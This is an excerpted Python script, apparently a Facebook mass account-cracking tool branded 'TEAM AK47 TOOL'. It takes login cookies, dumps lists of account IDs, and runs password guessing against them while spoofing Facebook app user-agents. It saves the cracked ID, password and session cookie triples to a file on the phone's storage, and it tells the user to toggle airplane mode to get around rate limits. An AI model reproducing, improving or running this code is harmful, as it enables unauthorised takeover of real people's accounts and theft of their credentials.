...
try:
        ...
        cetak(nel('\bâ€¢ instaling  Modul Rich â€¢'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\tâ€¢ Instaling Modul Stdiomask â€¢'))
...
os.system ("clear")
print ("Follow me on Facebook First")
...
try:
	...
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mWELL COME TO TEAM AK47 TOOL \033[1;35mâ€¢ \033[1;36mâ€¢ \033[1;34mâ€¢')
...
def banner():
	print('''                                             
\t\x1b[1;97m   8b    d8 8b    d8 .dP"Y8     
\t\x1b[1;92m  88b  d88 88b  d88 `Ybo."      
\t\x1b[1;97m  88YbdP88 88YbdP88 o.`Y8b       
\t\x1b[1;92m  88 YY 88 88 YY 88 8bodP'    
\x1b[1;97m --------------------------------------------------
 Source By : MMS
\x1b[1;97m Facebook : https://facebook.com/musa.khan.39545
...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}â€¢{x}] Input ðŸ¥® Cookies :{asu} ')
		...
		print(f'  {x}[{h}â€¢{x}]{h} LOGIN SUSCESFUL SO BRO ENJOYðŸ¥€OK IDZ!!!!{x} ');time.sleep(1)
		print(f'  {x}[{h}â€¢{x}]{h} BRO AGIN RUN COMMANDS!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILD SO BRO INPUT FRESH COOKIESðŸ¥® !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	gh = 'github.com/irtazaha'
	cetak(nel('\t[bold cyan]  LOGIN ACOUNT [yellow]%s[white] NAME'%(my_name)))
	print(f'>> Your Idz : '+str(my_id))
	print(f'>> Your Ip  : {ip}')
	print(f'>> Github   : {gh}')
	print('')
	print("%sâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•%s"%(B,P))
	print(f'[{H}âˆš{P}] [%s01%s] PUBLIC CRACKER   [%sON%s]'%(K,N,B,N));time.sleep(0.03)
	print(f'[{H}âˆš{P}] [%s02%s] MORE THEN ONE  CRACKER   [%sON%s]'%(K,N,B,N));time.sleep(0.03)
	print(f'[{H}âˆš{P}] [%s03%s] FILE CRACKER     [%sON%s]'%(K,N,B,N));time.sleep(0.03)
	print(f'[{H}âˆš{P}] [%s00%s] Logout (%sCookie%s)'%(M,N,M,N));time.sleep(0.03)
	print("%sâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•%s"%(B,P))
...
def dump_massal():
	...
	try:
		print('')
		print(f'>> Total idz dumpðŸ”¥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def passwrd():
	os.system('clear')
	banner()
	print(f'>>>>> {m}â€¢{k}â€¢{h}â€¢{x} USE AIRPLANE MOD FOR SPEED UP{m}â€¢{k}â€¢{h}â€¢{x} <<<<< ')
	print (47*'-')
	print('')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO AC8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36'
			ses = requests.Session()
